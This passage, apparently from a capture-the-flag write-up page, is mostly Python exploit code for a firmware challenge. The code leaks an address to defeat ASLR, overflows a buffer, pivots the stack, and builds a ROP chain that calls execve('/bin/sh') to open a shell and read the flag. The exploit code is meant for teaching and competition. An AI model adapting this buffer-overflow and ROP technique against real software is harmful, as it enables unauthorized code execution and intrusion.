+<a class="sourceLine" id="cb17-55" data-line-number="55"><span class="bu">print</span>([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> rpm_alert_addr])</a>
+<a class="sourceLine" id="cb17-56" data-line-number="56"></a>
+<a class="sourceLine" id="cb17-57" data-line-number="57"><span class="bu">print</span>(base256_to_int([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> rpm_alert_addr]))</a>
+<a class="sourceLine" id="cb17-58" data-line-number="58"></a>
+<a class="sourceLine" id="cb17-59" data-line-number="59">write_material(<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x4C</span>)</a>
+<a class="sourceLine" id="cb17-60" data-line-number="60">material_readout <span class="op">=</span> read_material()</a>
+<a class="sourceLine" id="cb17-61" data-line-number="61"><span class="cf">assert</span> material_readout[:<span class="bn">0x4C</span>] <span class="op">==</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x4C</span></a>
+<a class="sourceLine" id="cb17-62" data-line-number="62"></a>
+<a class="sourceLine" id="cb17-63" data-line-number="63">abort_addr <span class="op">=</span> material_readout[<span class="bn">0x4C</span>:]</a>
+<a class="sourceLine" id="cb17-64" data-line-number="64"><span class="cf">while</span> <span class="bu">len</span>(abort_addr) <span class="op">&lt;</span> <span class="dv">8</span>: abort_addr <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span></a>
+<a class="sourceLine" id="cb17-65" data-line-number="65"></a>
+<a class="sourceLine" id="cb17-66" data-line-number="66"><span class="co"># haxx for null bytes in address, esp. with ASLR off:</span></a>
+<a class="sourceLine" id="cb17-67" data-line-number="67"><span class="co"># abort_addr = abort_addr[:5] + &#39;\x7f&#39; + &#39;\0\0&#39;</span></a>
+<a class="sourceLine" id="cb17-68" data-line-number="68"></a>
+<a class="sourceLine" id="cb17-69" data-line-number="69">current_abort <span class="op">=</span> base256_to_int([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> abort_addr])</a>
+<a class="sourceLine" id="cb17-70" data-line-number="70">aslr_off_abort <span class="op">=</span> 0x7f000025eec0L</a>
+<a class="sourceLine" id="cb17-71" data-line-number="71">aslr_offset <span class="op">=</span> current_abort <span class="op">-</span> aslr_off_abort</a>
+<a class="sourceLine" id="cb17-72" data-line-number="72"></a>
+<a class="sourceLine" id="cb17-73" data-line-number="73"><span class="co"># given a ROP gadget address from the ROP tab, turn it into an</span></a>
+<a class="sourceLine" id="cb17-74" data-line-number="74"><span class="co"># actual string of bytes that&#39;s an address</span></a>
+<a class="sourceLine" id="cb17-75" data-line-number="75"><span class="kw">def</span> aslr_pos(pos):</a>
+<a class="sourceLine" id="cb17-76" data-line-number="76">    n <span class="op">=</span> <span class="bn">0x7f0000228000</span> <span class="op">+</span> aslr_offset <span class="op">+</span> pos</a>
+<a class="sourceLine" id="cb17-77" data-line-number="77">    <span class="bu">print</span> <span class="st">&#39;aslr_pos =&#39;</span>, <span class="bu">hex</span>(n)</a>
+<a class="sourceLine" id="cb17-78" data-line-number="78">    ret <span class="op">=</span> []</a>
+<a class="sourceLine" id="cb17-79" data-line-number="79">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</a>
+<a class="sourceLine" id="cb17-80" data-line-number="80">        ret.append(<span class="bu">chr</span>(n <span class="op">%</span> <span class="dv">256</span>))</a>
+<a class="sourceLine" id="cb17-81" data-line-number="81">        n <span class="op">//=</span> <span class="dv">256</span></a>
+<a class="sourceLine" id="cb17-82" data-line-number="82">    <span class="cf">return</span> <span class="st">&#39;&#39;</span>.join(ret)</a>
+<a class="sourceLine" id="cb17-83" data-line-number="83"></a>
+<a class="sourceLine" id="cb17-84" data-line-number="84"><span class="co"># add rsp, 0x38</span></a>
+<a class="sourceLine" id="cb17-85" data-line-number="85"><span class="co"># puts stack pointer at cmd + 0x10, hopefully.</span></a>
+<a class="sourceLine" id="cb17-86" data-line-number="86">stack_pivot <span class="op">=</span> aslr_pos(<span class="bn">0xc96a6</span>)</a>
+<a class="sourceLine" id="cb17-87" data-line-number="87"><span class="bu">print</span> <span class="st">&#39;stack pivot&#39;</span>, <span class="bu">repr</span>(stack_pivot)</a>
+<a class="sourceLine" id="cb17-88" data-line-number="88"></a>
+<a class="sourceLine" id="cb17-89" data-line-number="89"><span class="co"># run_firmware(&#39;7&#39; * 100)</span></a>
+<a class="sourceLine" id="cb17-90" data-line-number="90"></a>
+<a class="sourceLine" id="cb17-91" data-line-number="91"><span class="kw">def</span> run_and_jump(addr, execute_cmd):</a>
+<a class="sourceLine" id="cb17-92" data-line-number="92">    run_firmware(<span class="st">&#39;&#39;</span>.join(<span class="st">&#39;2&#39;</span><span class="op">+</span>c <span class="cf">for</span> c <span class="kw">in</span> <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x44</span> <span class="op">+</span> addr) <span class="op">+</span> <span class="st">&#39;7&#39;</span> <span class="op">*</span> <span class="dv">100</span>,</a>
+<a class="sourceLine" id="cb17-93" data-line-number="93">        execute_cmd, last_rd <span class="op">=</span> <span class="va">False</span>)</a>
+<a class="sourceLine" id="cb17-94" data-line-number="94"></a>
+<a class="sourceLine" id="cb17-95" data-line-number="95"><span class="bu">print</span>(<span class="st">&quot;wow!&quot;</span>)</a>
+<a class="sourceLine" id="cb17-96" data-line-number="96"><span class="co"># run_and_jump(abort_addr)</span></a>
+<a class="sourceLine" id="cb17-97" data-line-number="97">run_and_jump(stack_pivot, <span class="st">&#39;E&#39;</span> <span class="op">*</span> <span class="dv">16</span></a>
+<a class="sourceLine" id="cb17-98" data-line-number="98">    <span class="op">+</span> aslr_pos(<span class="bn">0x33544</span>) <span class="co"># pop rax ; ret</span></a>
+<a class="sourceLine" id="cb17-99" data-line-number="99">    <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\x3b\0\0\0\0\0\0\0</span><span class="st">&#39;</span></a>
+<a class="sourceLine" id="cb17-100" data-line-number="100">    <span class="op">+</span> aslr_pos(<span class="bn">0x21102</span>) <span class="co"># pop rdi ; ret</span></a>
+<a class="sourceLine" id="cb17-101" data-line-number="101">    <span class="op">+</span> aslr_pos(<span class="bn">0x3b4d57</span> <span class="op">-</span> <span class="bn">0x228000</span>) <span class="co"># &quot;/bin/sh&quot;</span></a>
+<a class="sourceLine" id="cb17-102" data-line-number="102">    <span class="op">+</span> aslr_pos(<span class="bn">0x1150c9</span>) <span class="co"># pop rdx ; pop rsi ; ret</span></a>
+<a class="sourceLine" id="cb17-103" data-line-number="103">    <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">16</span></a>
+<a class="sourceLine" id="cb17-104" data-line-number="104">    <span class="op">+</span> aslr_pos(<span class="bn">0xbc375</span>) <span class="co"># syscall ; ret</span></a>
+<a class="sourceLine" id="cb17-105" data-line-number="105">    )</a>
+<a class="sourceLine" id="cb17-106" data-line-number="106"></a>
+<a class="sourceLine" id="cb17-107" data-line-number="107">p.sendline(<span class="st">&quot;ls&quot;</span>)</a>
+<a class="sourceLine" id="cb17-108" data-line-number="108"></a>
+<a class="sourceLine" id="cb17-109" data-line-number="109">p.interactive()</a></code></pre></div>
 <p>Running <code>cat flag</code> in our new shell gives us the flag!</p>
 <pre><code>flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}</code></pre></article>
 	<footer class="post-footer">
